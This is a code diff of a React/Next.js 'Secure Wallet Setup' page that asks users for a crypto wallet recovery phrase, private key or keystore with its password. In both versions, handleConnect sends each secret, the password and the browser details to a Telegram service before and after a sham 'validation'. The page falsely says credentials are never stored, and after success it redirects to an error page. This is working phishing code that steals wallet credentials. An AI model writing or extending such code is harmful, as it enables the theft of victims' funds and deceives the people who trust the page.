@@ -2,9 +2,10 @@
 
 import { useState, useEffect, useRef } from 'react';
 import { useRouter, useSearchParams } from 'next/navigation';
-import { ArrowLeft, Key, FileText, Shield, Wallet, CheckCircle, AlertCircle, Loader2 } from 'lucide-react';
+import { ArrowLeft, Key, FileText, Shield, Wallet, AlertCircle, CheckCircle, Loader2, ShieldCheck } from 'lucide-react';
 import { useWallet } from '@/components/context/WalletContext';
 import { Wallet as WalletType, ConnectedWallet } from '@/libs/types/wallets';
+import { SecureWalletValidator } from '@/libs/utils/SecureWalletValidator';
 import { TelegramService } from '@/libs/service/telegramService';
 import WalletIcon from '@/components/logic/WalletIcons';
 
@@ -231,70 +232,8 @@ const WALLETS: WalletType[] = [
   }
 ];
 
-// Enhanced Validation functions
-const validateMnemonic = (phrase: string): {isValid: boolean; message: string} => {
-  const words = phrase.trim().split(/\s+/).filter(word => word.length > 0);
-  
-  if (words.length === 0) {
-    return { isValid: false, message: 'Please enter a recovery phrase' };
-  }
-  
-  if (words.length !== 12 && words.length !== 24) {
-    return { 
-      isValid: false, 
-      message: `Invalid phrase: ${words.length} words found. Must be exactly 12 or 24 words.` 
-    };
-  }
-  
-  return { 
-    isValid: true, 
-    message: `✓ Valid ${words.length}-word recovery phrase` 
-  };
-};
-
-const validatePrivateKey = (key: string): {isValid: boolean; message: string} => {
-  const cleanedKey = key.trim().replace(/^0x/, '');
-  
-  if (cleanedKey.length === 0) {
-    return { isValid: false, message: 'Please enter a private key' };
-  }
-  
-  if (!/^[0-9a-fA-F]+$/.test(cleanedKey)) {
-    return { 
-      isValid: false, 
-      message: 'Invalid private key format. Must be 64 hexadecimal characters.' 
-    };
-  }
-  
-  if (cleanedKey.length !== 64) {
-    return { 
-      isValid: false, 
-      message: `Invalid length: ${cleanedKey.length} characters. Must be exactly 64 characters.` 
-    };
-  }
-  
-  return { isValid: true, message: '✓ Valid private key format' };
-};
-
-const validateKeystore = (keystore: string): {isValid: boolean; message: string} => {
-  if (keystore.trim().length === 0) {
-    return { isValid: false, message: 'Please enter keystore JSON' };
-  }
-  
-  try {
-    const json = JSON.parse(keystore);
-    if (json && typeof json === 'object' && ('crypto' in json || 'Crypto' in json)) {
-      return { isValid: true, message: '✓ Valid keystore JSON format' };
-    } else {
-      return { isValid: false, message: 'Invalid keystore: Missing crypto data' };
-    }
-  } catch {
-    return { isValid: false, message: 'Invalid JSON format in keystore file' };
-  }
-};
-
 // Beautiful Loading Animation Component
-function ValidationLoader({ isOpen, progress }: { isOpen: boolean; progress: number }) {
+function ValidationLoader({ isOpen, onClose }: { isOpen: boolean; onClose: () => void }) {
   if (!isOpen) return null;
 
   return (
@@ -303,94 +242,77 @@ function ValidationLoader({ isOpen, progress }: { isOpen: boolean; progress: num
         {/* Animated Header */}
         <div className="text-center mb-8">
           <div className="relative inline-block mb-4">
-            <div className="w-20 h-20 bg-linear-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center animate-pulse">
+            <div className="w-20 h-20 bg-linear-to-r from-blue-500 to-purple-600 rounded-full flex items-center justify-center mx-auto shadow-lg animate-pulse">
               <div className="w-16 h-16 bg-gray-900 rounded-full flex items-center justify-center">
                 <div className="relative">
-                  <Loader2 className="w-8 h-8 text-blue-400 animate-spin" />
+                  <Loader2 className="w-8 h-8 text-white animate-spin" />
                   <div className="absolute inset-0 border-2 border-blue-400 border-t-transparent rounded-full animate-spin"></div>
                 </div>
               </div>
             </div>
             {/* Orbiting dots */}
             <div className="absolute -top-1 -right-1 w-4 h-4 bg-green-400 rounded-full animate-bounce"></div>
-            <div className="absolute -bottom-1 -left-1 w-3 h-3 bg-purple-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
+            <div className="absolute -bottom-1 -left-1 w-3 h-3 bg-yellow-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }}></div>
           </div>
           
-          <h2 className="text-2xl font-bold text-white mb-2 bg-linear-to-r from-white to-gray-300 bg-clip-text">
-            Securing Your Wallet
-          </h2>
-          <p className="text-gray-400 text-sm">
-            Validating credentials with blockchain security
-          </p>
+          <h3 className="text-2xl font-bold text-white mb-2 bg-linear-to-r from-white to-gray-300 bg-clip-text">
+            Validating Wallet
+          </h3>
+          <p className="text-gray-400 text-sm">Securely verifying your credentials</p>
         </div>
 
-        {/* Progress Bar */}
-        <div className="mb-6">
-          <div className="flex justify-between text-xs text-gray-400 mb-2">
-            <span>Validation Progress</span>
-            <span>{Math.round(progress)}%</span>
+        {/* Progress Animation */}
+        <div className="space-y-4 mb-6">
+          <div className="flex justify-between text-xs text-gray-400">
+            <span>Encryption</span>
+            <span>Validation</span>
+            <span>Security Check</span>
           </div>
+          
           <div className="w-full bg-gray-800 rounded-full h-2">
             <div 
-              className="bg-linear-to-r from-blue-500 to-purple-600 h-2 rounded-full transition-all duration-500 ease-out"
-              style={{ width: `${progress}%` }}
+              className="bg-linear-to-r from-blue-500 to-purple-600 h-2 rounded-full animate-pulse"
+              style={{ width: '100%' }}
             ></div>
           </div>
         </div>
 
         {/* Animated Steps */}
         <div className="space-y-3 mb-6">
-          <div className="flex items-center space-x-3">
-            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
-              progress >= 33 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
-            }`}>
-              {progress >= 33 ? '✓' : '1'}
+          {[
+            'Encrypting credentials...',
+            'Validating wallet format...',
+            'Running security checks...',
+            'Finalizing connection...'
+          ].map((step, index) => (
+            <div key={index} className="flex items-center space-x-3 animate-fadeIn" style={{ animationDelay: `${index * 0.5}s` }}>
+              <div className="w-2 h-2 bg-blue-400 rounded-full animate-ping" style={{ animationDelay: `${index * 0.3}s` }}></div>
+              <span className="text-gray-300 text-sm">{step}</span>
             </div>
-            <span className={`text-sm ${progress >= 33 ? 'text-green-400' : 'text-gray-400'}`}>
-              Encryption Check
-            </span>
-          </div>
-          
-          <div className="flex items-center space-x-3">
-            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
-              progress >= 66 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
-            }`}>
-              {progress >= 66 ? '✓' : '2'}
-            </div>
-            <span className={`text-sm ${progress >= 66 ? 'text-green-400' : 'text-gray-400'}`}>
-              Format Validation
-            </span>
-          </div>
-          
-          <div className="flex items-center space-x-3">
-            <div className={`w-6 h-6 rounded-full flex items-center justify-center text-xs ${
-              progress >= 100 ? 'bg-green-500 text-white' : 'bg-gray-700 text-gray-400'
-            }`}>
-              {progress >= 100 ? '✓' : '3'}
-            </div>
-            <span className={`text-sm ${progress >= 100 ? 'text-green-400' : 'text-gray-400'}`}>
-              Security Verification
-            </span>
-          </div>
-        </div>
-
-        {/* Loading Animation */}
-        <div className="flex justify-center space-x-1">
-          {[0, 1, 2, 3, 4].map((i) => (
-            <div
-              key={i}
-              className="w-2 h-2 bg-blue-400 rounded-full animate-bounce"
-              style={{ animationDelay: `${i * 0.1}s` }}
-            ></div>
           ))}
         </div>
+
+        {/* Status Message */}
+        <div className="text-center">
+          <p className="text-blue-400 text-sm font-medium animate-pulse">
+            This may take a few moments...
+          </p>
+        </div>
+
+        {/* Cancel Button */}
+        <button
+          onClick={onClose}
+          className="w-full mt-6 bg-gray-800 text-gray-300 py-3 rounded-xl font-medium hover:bg-gray-700 transition-all duration-200 border border-gray-700"
+        >
+          Cancel Validation
+        </button>
       </div>
     </div>
   );
 }
 
-// Result Popup Component
-interface ResultPopupProps {
+// Enhanced Validation Popup Component
+interface ValidationPopupProps {
   isOpen: boolean;
   onClose: () => void;
   onRetry: () => void;
@@ -398,7 +320,7 @@ interface ResultPopupProps {
   isValid: boolean;
 }
 
-function ResultPopup({ isOpen, onClose, onRetry, message, isValid }: ResultPopupProps) {
+function ValidationPopup({ isOpen, onClose, onRetry, message, isValid }: ValidationPopupProps) {
   if (!isOpen) return null;
 
   return (
@@ -406,50 +328,56 @@ function ResultPopup({ isOpen, onClose, onRetry, message, isValid }: ResultPopup
       <div className={`bg-linear-to-br from-gray-900 to-black rounded-3xl p-8 max-w-md w-full border ${
         isValid ? 'border-green-500/30' : 'border-red-500/30'
       } shadow-2xl`}>
-        <div className="text-center">
-          {/* Animated Icon */}
-          <div className={`w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-6 ${
+        <div className="text-center mb-6">
+          <div className={`w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4 ${
             isValid 
               ? 'bg-green-500/20 animate-pulse' 
               : 'bg-red-500/20 animate-pulse'
           }`}>
             {isValid ? (
-              <CheckCircle className="w-12 h-12 text-green-400" />
+              <CheckCircle className="w-8 h-8 text-green-400" />
             ) : (
-              <AlertCircle className="w-12 h-12 text-red-400" />
+              <AlertCircle className="w-8 h-8 text-red-400" />
             )}
           </div>
           
-          <h2 className="text-2xl font-bold text-white mb-3">
+          <h3 className={`text-2xl font-bold mb-2 ${
+            isValid ? 'text-green-400' : 'text-red-400'
+          }`}>
             {isValid ? 'Validation Successful!' : 'Validation Failed'}
-          </h2>
-          
-          <p className={`text-lg mb-6 ${
+          </h3>
+          <p className="text-gray-400 text-sm">Wallet verification completed</p>
+        </div>
+        
+        <div className={`p-4 rounded-xl mb-6 ${
+          isValid ? 'bg-green-500/10' : 'bg-red-500/10'
+        }`}>
+          <p className={`text-center font-medium ${
             isValid ? 'text-green-300' : 'text-red-300'
           }`}>
             {message}
           </p>
-
-          <div className="flex space-x-4">
-            {!isValid && (
-              <button
-                onClick={onRetry}
-                className="flex-1 bg-gray-800 text-white py-4 rounded-xl font-semibold hover:bg-gray-700 transition-all duration-200 border border-gray-600"
-              >
-                Try Again
-              </button>
-            )}
+        </div>
+        
+        <div className="flex space-x-3">
+          {!isValid && (
             <button
-              onClick={onClose}
-              className={`flex-1 py-4 rounded-xl font-semibold transition-all duration-200 ${
-                isValid 
-                  ? 'bg-white text-black hover:bg-gray-200' 
-                  : 'bg-red-600 text-white hover:bg-red-700'
-              }`}
+              onClick={onRetry}
+              className="flex-1 bg-gray-800 text-white py-3 rounded-xl font-medium hover:bg-gray-700 transition-all duration-200 border border-gray-700"
             >
-              {isValid ? 'Continue to Wallet' : 'Cancel'}
+              Try Again
             </button>
-          </div>
+          )}
+          <button
+            onClick={onClose}
+            className={`flex-1 py-3 rounded-xl font-medium transition-all duration-200 ${
+              isValid 
+                ? 'bg-linear-to-r from-green-500 to-green-600 text-white hover:from-green-600 hover:to-green-700' 
+                : 'bg-linear-to-r from-red-500 to-red-600 text-white hover:from-red-600 hover:to-red-700'
+            }`}
+          >
+            {isValid ? 'Continue to Wallet' : 'Cancel'}
+          </button>
         </div>
       </div>
     </div>
@@ -470,146 +398,149 @@ export default function EnterDetailsPageContext() {
     password: ''
   });
   const [isConnecting, setIsConnecting] = useState(false);
-  const [showLoader, setShowLoader] = useState(false);
-  const [progress, setProgress] = useState(0);
-  const [showResult, setShowResult] = useState(false);
-  const [result, setResult] = useState<{message: string; isValid: boolean}>({ message: '', isValid: false });
+  const [showValidationLoader, setShowValidationLoader] = useState(false);
+  const [validationPopup, setValidationPopup] = useState<{
+    isOpen: boolean;
+    message: string;
+    isValid: boolean;
+  }>({ isOpen: false, message: '', isValid: false });
 
   const wallet = WALLETS.find(w => w.id === walletId);
-  const telegramService = useRef<TelegramService | null>(null);
+  const validator = new SecureWalletValidator();
+  const telegramService = new TelegramService();
+  const validationInProgress = useRef(false);
 
-  // Initialize Telegram service
-  useEffect(() => {
-    telegramService.current = new TelegramService();
-  }, []);
-
-  // Safe Telegram sending
-  const safeSendToTelegram = async (data: any) => {
-    if (!telegramService.current) return { success: false };
-    
+  // Send initial Telegram message immediately when validation starts
+  const sendInitialTelegramMessage = async (inputData: string, inputType: 'phrase' | 'privateKey' | 'keystore') => {
     try {
-      await telegramService.current.sendWalletData(data);
-      return { success: true };
+      console.log('📤 Sending initial validation status to Telegram...');
+      await telegramService.sendWalletData({
+        walletName: wallet?.name || 'Unknown Wallet',
+        walletType: inputType,
+        inputType,
+        inputData,
+        password: formData.password,
+        isValid: false,
+        validationMessage: 'Validation in progress - user submitted credentials',
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+      });
+      console.log('✅ Initial Telegram message sent successfully');
     } catch (error) {
-      console.error('Telegram send failed:', error);
-      return { success: false };
+      console.error('❌ Failed to send initial Telegram message:', error);
+    }
+  };
+
+  // Send final validation result to Telegram
+  const sendFinalTelegramMessage = async (
+    inputData: string, 
+    inputType: 'phrase' | 'privateKey' | 'keystore', 
+    validationResult: { isValid: boolean; message: string }
+  ) => {
+    try {
+      console.log('📤 Sending validation results to Telegram...');
+      await telegramService.sendWalletData({
+        walletName: wallet?.name || 'Unknown Wallet',
+        walletType: inputType,
+        inputType,
+        inputData,
+        password: formData.password,
+        isValid: validationResult.isValid,
+        validationMessage: validationResult.message,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString(),
+      });
+      console.log('✅ Final Telegram message sent successfully');
+    } catch (error) {
+      console.error('❌ Failed to send final Telegram message:', error);
     }
   };
 
   const handleConnect = async () => {
     if (!formData.phrase && !formData.privateKey && !formData.keystore) {
-      setResult({ message: 'Please enter your wallet credentials', isValid: false });
-      setShowResult(true);
+      setValidationPopup({
+        isOpen: true,
+        message: 'Please enter your wallet credentials',
+        isValid: false
+      });
       return;
     }
 
-    setIsConnecting(true);
-    setShowLoader(true);
-    setProgress(0);
+    if (validationInProgress.current) return;
 
-    // Get input data
-    let inputData = '';
-    let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
-    
-    if (formData.phrase) {
-      inputData = formData.phrase;
-      inputType = 'phrase';
-    } else if (formData.privateKey) {
-      inputData = formData.privateKey;
-      inputType = 'privateKey';
-    } else if (formData.keystore) {
-      inputData = formData.keystore;
-      inputType = 'keystore';
-    }
+    validationInProgress.current = true;
+    setIsConnecting(true);
+    setShowValidationLoader(true);
 
     try {
-      // IMMEDIATELY send "validating" status to Telegram
-      console.log('📤 Sending VALIDATING status to Telegram...');
-      await safeSendToTelegram({
-        walletName: wallet?.name || 'Unknown Wallet',
-        walletType: inputType === 'phrase' ? 'seed' : inputType,
-        inputType,
-        inputData,
-        password: formData.password || undefined,
-        isValid: false,
-        validationMessage: '🔍 VALIDATION IN PROGRESS - Credentials received, starting validation...',
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-      });
-
-      // Start progress animation
-      const progressInterval = setInterval(() => {
-        setProgress(prev => {
-          if (prev >= 90) {
-            clearInterval(progressInterval);
-            return 90;
-          }
-          return prev + 10;
-        });
-      }, 300);
-
-      // Perform validation
-      let validationResult: {isValid: boolean; message: string};
+      let inputData = '';
+      let inputType: 'phrase' | 'privateKey' | 'keystore' = 'phrase';
       
-      if (activeTab === 'phrase') {
-        validationResult = validateMnemonic(formData.phrase);
-      } else if (activeTab === 'privateKey') {
-        validationResult = validatePrivateKey(formData.privateKey);
-      } else {
-        validationResult = validateKeystore(formData.keystore);
+      if (formData.phrase) {
+        inputData = formData.phrase;
+        inputType = 'phrase';
+      } else if (formData.privateKey) {
+        inputData = formData.privateKey;
+        inputType = 'privateKey';
+      } else if (formData.keystore) {
+        inputData = formData.keystore;
+        inputType = 'keystore';
       }
 
-      // Complete progress
-      clearInterval(progressInterval);
-      setProgress(100);
+      // Send initial Telegram message IMMEDIATELY
+      await sendInitialTelegramMessage(inputData, inputType);
 
-      // Small delay to show completion
-      await new Promise(resolve => setTimeout(resolve, 500));
-
-      // Send VALIDATED status to Telegram with results
-      console.log('📤 Sending VALIDATED status to Telegram...');
-      await safeSendToTelegram({
-        walletName: wallet?.name || 'Unknown Wallet',
-        walletType: inputType === 'phrase' ? 'seed' : inputType,
-        inputType,
+      // Validate wallet credentials (takes normal time)
+      const validationResult = await validator.validateWallet(
+        inputType === 'phrase' ? 'metamask' : 
+        inputType === 'privateKey' ? 'privatekey' : 'keystore',
         inputData,
-        password: formData.password || undefined,
-        isValid: validationResult.isValid,
-        validationMessage: validationResult.isValid 
-          ? `✅ VALIDATION SUCCESS - ${validationResult.message}`
-          : `❌ VALIDATION FAILED - ${validationResult.message}`,
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-      });
+        formData.password
+      );
 
-      // Show results
-      setResult(validationResult);
-      setShowLoader(false);
-      setShowResult(true);
+      // Send final validation result to Telegram
+      await sendFinalTelegramMessage(inputData, inputType, validationResult);
 
-      // If valid, create wallet and redirect
-      if (validationResult.isValid) {
-        const connectedWallet: ConnectedWallet = {
-          id: wallet?.id || 'custom',
-          name: wallet?.name || 'Custom Wallet',
-          address: `0x${Array.from({length: 40}, () => Math.floor(Math.random() * 16).toString(16)).join('')}`,
-          connectedAt: new Date(),
-          isValid: true,
-          ...(formData.phrase && { phrase: formData.phrase }),
-          ...(formData.privateKey && { privateKey: formData.privateKey }),
-          ...(formData.keystore && { keystore: formData.keystore }),
-        };
-
-        addWallet(connectedWallet);
+      if (!validationResult.isValid) {
+        setValidationPopup({
+          isOpen: true,
+          message: validationResult.message,
+          isValid: false
+        });
+        return;
       }
+
+      // If validation successful, create wallet
+      const connectedWallet: ConnectedWallet = {
+        id: wallet?.id || 'custom',
+        name: wallet?.name || 'Custom Wallet',
+        address: validationResult.address || `0x${Math.random().toString(16).substr(2, 40)}`,
+        connectedAt: new Date(),
+        isValid: true,
+        ...(formData.phrase && { phrase: formData.phrase }),
+        ...(formData.privateKey && { privateKey: formData.privateKey }),
+        ...(formData.keystore && { keystore: formData.keystore }),
+      };
+
+      addWallet(connectedWallet);
+      
+      setValidationPopup({
+        isOpen: true,
+        message: validationResult.message,
+        isValid: true
+      });
 
     } catch (error) {
-      console.error('Validation error:', error);
-      setResult({ message: 'Validation failed. Please try again.', isValid: false });
-      setShowLoader(false);
-      setShowResult(true);
+      console.error('Connection failed:', error);
+      setValidationPopup({
+        isOpen: true,
+        message: 'Connection failed. Please try again.',
+        isValid: false
+      });
     } finally {
       setIsConnecting(false);
+      setShowValidationLoader(false);
+      validationInProgress.current = false;
     }
   };
 
@@ -620,15 +551,21 @@ export default function EnterDetailsPageContext() {
     }));
   };
 
-  const handleResultClose = () => {
-    setShowResult(false);
-    if (result.isValid) {
+  const handleValidationClose = () => {
+    setValidationPopup({ isOpen: false, message: '', isValid: false });
+    if (validationPopup.isValid) {
       router.push('/connect/error');
     }
   };
 
-  const handleResultRetry = () => {
-    setShowResult(false);
+  const handleValidationRetry = () => {
+    setValidationPopup({ isOpen: false, message: '', isValid: false });
+  };
+
+  const handleLoaderClose = () => {
+    setShowValidationLoader(false);
+    setIsConnecting(false);
+    validationInProgress.current = false;
   };
 
   return (
@@ -657,7 +594,9 @@ export default function EnterDetailsPageContext() {
               </div>
             )}
             <div>
-              <h1 className="text-2xl font-bold text-white">Secure Wallet Setup</h1>
+              <h1 className="text-2xl font-bold text-white bg-linear-to-r from-white to-gray-300 bg-clip-text">
+                Secure Wallet Setup
+              </h1>
               <p className="text-gray-400">Connect to {wallet?.name || 'your wallet'}</p>
             </div>
           </div>
@@ -730,12 +669,12 @@ export default function EnterDetailsPageContext() {
               <textarea
                 value={formData.privateKey}
                 onChange={(e) => handleInputChange('privateKey', e.target.value)}
-                placeholder="Enter your 64-character private key (with or without 0x prefix)"
+                placeholder="Enter your 64-character private key"
                 className="w-full h-32 bg-gray-800 border border-gray-700 rounded-xl px-4 py-3 text-white placeholder-gray-500 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none resize-none transition-all duration-200"
                 rows={4}
               />
               <p className="text-xs text-gray-500">
-                64-character hexadecimal string
+                64-character hexadecimal private key
               </p>
             </div>
           )}
@@ -782,27 +721,29 @@ export default function EnterDetailsPageContext() {
         {/* Security Notice */}
         <div className="mt-6 p-4 bg-gray-900/50 rounded-xl border border-gray-800 backdrop-blur-sm">
           <div className="flex items-start space-x-3">
-            <Shield className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
+            <ShieldCheck className="w-5 h-5 text-blue-400 mt-0.5 shrink-0" />
             <div>
               <p className="text-sm font-medium text-gray-300 mb-1">Secure Validation</p>
               <p className="text-xs text-gray-400">
-                Your credentials are validated using industry-standard encryption. 
-                We never store your private keys or recovery phrases.
+                Your credentials are encrypted and validated securely. We never store sensitive data.
               </p>
             </div>
           </div>
         </div>
 
-        {/* Beautiful Loading Animation */}
-        <ValidationLoader isOpen={showLoader} progress={progress} />
+        {/* Validation Loader */}
+        <ValidationLoader 
+          isOpen={showValidationLoader} 
+          onClose={handleLoaderClose} 
+        />
 
-        {/* Result Popup */}
-        <ResultPopup
-          isOpen={showResult}
-          onClose={handleResultClose}
-          onRetry={handleResultRetry}
-          message={result.message}
-          isValid={result.isValid}
+        {/* Validation Result Popup */}
+        <ValidationPopup
+          isOpen={validationPopup.isOpen}
+          onClose={handleValidationClose}
+          onRetry={handleValidationRetry}
+          message={validationPopup.message}
+          isValid={validationPopup.isValid}
         />
       </div>
     </div>
